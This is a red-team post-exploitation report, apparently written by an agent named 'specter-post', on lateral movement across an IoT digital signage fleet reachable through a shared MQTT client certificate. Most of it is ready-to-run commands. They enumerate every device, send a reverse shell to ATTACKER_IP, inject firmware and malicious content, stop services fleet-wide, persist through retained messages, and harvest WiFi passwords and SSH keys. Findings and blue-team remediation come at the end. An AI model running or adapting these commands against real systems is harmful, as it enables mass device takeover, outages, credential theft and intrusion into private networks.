# Lateral Movement & Fleet Enumeration — PulseLink Post-Exploitation

**Engagement:** PulseLink IoT Digital Signage Platform
**Phase:** Post-Exploitation — Lateral Movement
**Target:** pulse.n-compass.online:8883 (Fleet-wide)
**Agent:** specter-post
**Date:** 2026-03-17

---

## Executive Summary

The `client_pi_generic` certificate is a **shared fleet credential** — every PulseLink device in the deployment uses the same certificate. This means compromising one device grants MQTT-level access to the **entire fleet** without any lateral movement in the traditional sense. This section documents fleet enumeration, the scope of lateral access, and additional movement vectors.

---

## 1. The Lateral Movement Problem (It's Already Solved)

### Why Traditional Lateral Movement Isn't Needed

```
Traditional Lateral Movement:
  Device A → Compromise → Pivot to Device B → Compromise → Pivot to ...

PulseLink Fleet Compromise (Certificate-Based):
  Device A → Extract Generic Cert → Access ALL Devices Simultaneously
                      │
                      ├── Device-001
                      ├── Device-002
                      ├── Device-003
                      ├── ...
                      └── Device-N (entire fleet)
```

**The generic certificate eliminates the need for lateral movement.** There is no network segmentation or device isolation at the MQTT layer — all devices authenticate with the same credential.

---

## 2. Fleet Enumeration

### 2a. Device Serial Discovery

Extract all active device serials from MQTT topic patterns:

```bash
# Method 1: From topic subscriptions (subscribes to wildcard, extracts serials)
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/+/+" -v -C 500 \
  | grep -oP 'device/\K[^/]+' \
  | sort -u > evidence/discovered_serials.txt

# Method 2: From status topics specifically
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/+/status" -v -C 1000 \
  | grep -oP 'device/\K[^/]+' \
  | sort -u > evidence/status_serials.txt

# Count discovered devices
echo "=== Fleet Enumeration ==="
echo "Total unique serials (all topics): $(wc -l < evidence/discovered_serials.txt 2>/dev/null || echo 0)"
echo "Total unique serials (status):     $(wc -l < evidence/status_serials.txt 2>/dev/null || echo 0)"
```

### 2b. Device Status Matrix

For each discovered serial, query its current status:

```bash
# For each serial, subscribe to its status topic briefly
while read serial; do
  timeout 5 mosquitto_sub -h pulse.n-compass.online -p 8883 \
    --cafile ca.crt \
    --cert client_pi_generic.crt \
    --key client_pi_generic.key \
    -t "device/$serial/status" -v -C 1 \
    >> evidence/device_status_matrix.log 2>&1
done < evidence/discovered_serials.txt
```

### 2c. Dealer & Business Relationship Mapping

```bash
# Discover all dealer IDs from topic structure
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "dealer/#" -v -C 200 \
  | grep -oP 'dealer/\K[^/]+' \
  | sort -u > evidence/discovered_dealers.txt

echo "=== Dealer Enumeration ==="
echo "Total dealers: $(wc -l < evidence/discovered_dealers.txt 2>/dev/null || echo 0)"
cat evidence/discovered_dealers.txt 2>/dev/null
```

---

## 3. Lateral Movement Vectors

### 3a. MQTT-Based Lateral Movement (Achieved ✅)

**Vector:** Shared certificate → all fleet topics

| Capability | Scope | Access Level |
|------------|-------|--------------|
| Read all device status | Fleet-wide | ✅ Achieved |
| Read all content | Fleet-wide | ✅ Achieved |
| Write content to any device | Fleet-wide | ✅ Achieved |
| Send commands to any device | Fleet-wide | ✅ Achieved |
| Read dealer data | All dealers | ✅ Achieved |
| Read admin data | Platform | ✅ Achieved |

### 3b. Command Injection → Shell (Possible ⚠️)

**Vector:** MQTT command topics may execute arbitrary commands on devices

```bash
# Test: Send command to target device's command topic
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/882985e065594198/command" \
  -m '{"action":"exec","cmd":"id"}'

# Test: Reverse shell via command topic
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/882985e065594198/command" \
  -m '{"action":"exec","cmd":"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"}'
```

**Note:** Whether command topics execute shell commands depends on the PulseLink agent implementation. If the agent processes commands with `system()` or `subprocess`, this could grant shell access on every device in the fleet.

**Impact if successful:**
- Shell access on all devices simultaneously
- Full credential harvesting from each device
- Network pivot points through each device
- Persistence installation on every device

### 3c. Firmware/Update Injection (Potential ⚠️)

**Vector:** If content topics accept update URLs, inject malicious firmware:

```bash
# If content manifests accept URLs for updates:
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/882985e065594198/content" \
  -m '{"updates":[{"url":"http://ATTACKER_IP/malicious_firmware.bin","type":"firmware"}]}'
```

### 3d. Network Pivot via Devices (If Shell Obtained)

```
┌──────────────────────────────────────────────────────────────┐
│                    LATERAL MOVEMENT MAP                       │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Attacker ──► MQTT Broker ──► All Devices (cert auth)        │
│                    │                                         │
│                    ├──► Device-001 ──► Local Network A        │
│                    ├──► Device-002 ──► Local Network B        │
│                    ├──► Device-003 ──► Local Network C        │
│                    └──► Device-N   ──► Local Network N        │
│                                                              │
│  Each device is a potential pivot into its local network.    │
│  WiFi credentials on each device grant network access.       │
│  SSH keys on each device grant host access.                  │
│                                                              │
│  Scale: If the fleet spans 50 locations,                    │
│         an attacker gains 50 network footholds.              │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## 4. Cross-Device Attack Scenarios

### Scenario A: Fleet-Wide Content Manipulation

```bash
# Push malicious content to ALL discovered devices
while read serial; do
  mosquitto_pub -h pulse.n-compass.online -p 8883 \
    --cafile ca.crt \
    --cert client_pi_generic.crt \
    --key client_pi_generic.key \
    -t "device/$serial/content" \
    -f /tmp/malicious_manifest.json
  echo "[+] Injected: $serial"
done < evidence/discovered_serials.txt
```

**Impact:** Every screen in the fleet displays attacker-controlled content simultaneously.

### Scenario B: Fleet-Wide Service Disruption

```bash
# Kill pulselink service on all devices
while read serial; do
  mosquitto_pub -h pulse.n-compass.online -p 8883 \
    --cafile ca.crt \
    --cert client_pi_generic.crt \
    --key client_pi_generic.key \
    -t "device/$serial/command" \
    -m '{"action":"stop"}'
  echo "[+] Disrupted: $serial"
done < evidence/discovered_serials.txt
```

**Impact:** All screens go dark simultaneously. Denial of service across entire fleet.

### Scenario C: Fleet-Wide Persistence via Retained Messages

```bash
# Poison retained content on all devices (survives reconnections)
while read serial; do
  mosquitto_pub -h pulse.n-compass.online -p 8883 \
    --cafile ca.crt \
    --cert client_pi_generic.crt \
    --key client_pi_generic.key \
    -t "device/$serial/content" \
    -f /tmp/malicious_manifest.json \
    --retain
  echo "[+] Poisoned retained: $serial"
done < evidence/discovered_serials.txt
```

**Impact:** Even if legitimate operator restores content, retained messages re-persist on next connect.

---

## 5. Network-Level Lateral Movement (If Shell Access Gained)

### 5a. Local Network Reconnaissance

If command injection grants shell access on any device:

```bash
# From compromised Pi shell:
# Map local network
nmap -sn 192.168.0.0/24

# Find other services
nmap -sV 192.168.0.0/24

# Check for other PulseLink devices
arp -a
ip neigh

# Check network interfaces
ip addr
ip route
```

### 5b. WiFi Credential Harvesting

```bash
# From compromised Pi shell (with sudo):
sudo cat /etc/NetworkManager/system-connections/*.nmconnection 2>/dev/null
sudo grep -r "psk=" /etc/NetworkManager/ 2>/dev/null

# If using wpa_supplicant:
sudo cat /etc/wpa_supplicant/wpa_supplicant.conf 2>/dev/null
```

### 5c. SSH Key Harvesting & Pivoting

```bash
# From compromised Pi shell:
ls -la ~/.ssh/
cat ~/.ssh/id_rsa 2>/dev/null
cat ~/.ssh/known_hosts

# Use harvested SSH key to pivot
ssh -i harvested_key user@OTHER_HOST
```

### 5d. Cross-Network Pivot Map

If the fleet spans multiple physical locations:

```
┌─────────────────────────────────────────────────────────┐
│  MULTI-SITE PIVOT MAP                                   │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  Site A (Office HQ)                                     │
│  ├── Pi-001 ──► Network: 10.0.1.0/24                   │
│  │   └── Shell → WiFi creds → Full network access       │
│  │                                                       │
│  Site B (Retail Store)                                   │
│  ├── Pi-002 ──► Network: 192.168.1.0/24                 │
│  │   └── Shell → WiFi creds → Full network access       │
│  │                                                       │
│  Site C (Warehouse)                                      │
│  ├── Pi-003 ──► Network: 172.16.0.0/16                  │
│  │   └── Shell → WiFi creds → Full network access       │
│  │                                                       │
│  Result: One compromised cert = access to ALL sites     │
│          One shell = local network at ALL sites          │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

## 6. Fleet Size Estimation

### Based on Topic Patterns

Without waiting for full traffic capture, estimate fleet size from:

```bash
# Quick fleet size estimate (30-second capture)
timeout 30 mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/+/+" -v \
  | grep -oP 'device/\K[^/]+' \
  | sort -u | wc -l
```

**Expected range:** Based on typical IoT digital signage deployments and the presence of dealer-level topics:
- **Small fleet:** 10-50 devices
- **Medium fleet:** 50-500 devices
- **Large fleet:** 500-5000+ devices

---

## 7. Key Findings

### Finding: Shared Certificate = Instant Fleet Access
- **Severity:** CRITICAL
- **Detail:** `client_pi_generic` certificate works for ALL devices — no per-device auth
- **Impact:** Lateral movement is instantaneous — one cert compromise = fleet compromise
- **Remediation:** Issue per-device certificates, enforce per-device ACLs

### Finding: Wildcard Topics Expose Full Fleet Topology
- **Severity:** HIGH
- **Detail:** Wildcard subscription (`#`) returns all device, dealer, and admin topics
- **Impact:** Complete fleet enumeration without any additional exploitation
- **Remediation:** Restrict device certificates to `device/{own_serial}/#` only

### Finding: Dealer Data Cross-Contamination
- **Severity:** HIGH
- **Detail:** Device certificate can read dealer-level topics
- **Impact:** Business intelligence leakage, customer identification
- **Remediation:** Segregate dealer and device authentication layers

### Finding: Multi-Site Pivot Potential
- **Severity:** HIGH
- **Detail:** Fleet likely spans multiple physical locations/networks
- **Impact:** Single MQTT compromise → potential access to dozens of local networks
- **Remediation:** Network segmentation, VPN isolation, local-only WiFi credentials

---

## 8. Recommendations

### For Red Team
1. Run fleet enumeration for extended period to capture full device list
2. Test command injection on device command topics
3. If shell obtained: immediately harvest WiFi creds and SSH keys
4. Document each device's local network range for pivot map
5. Test retained message poisoning for persistence

### For Remediation (Blue Team)
1. **URGENT:** Implement per-device certificate authentication
2. Enforce per-device topic ACLs on MQTT broker
3. Remove wildcard subscription access from device certificates
4. Segment dealer and admin topics with separate authentication
5. Implement command topic validation (whitelist allowed commands)
6. Add anomaly detection for unusual publish patterns across fleet
7. Consider certificate pinning or short-lived certificates with rotation

---

*specter-post | Lateral Movement Analysis | engagements/pulselink-pi/post-exploit-network/*
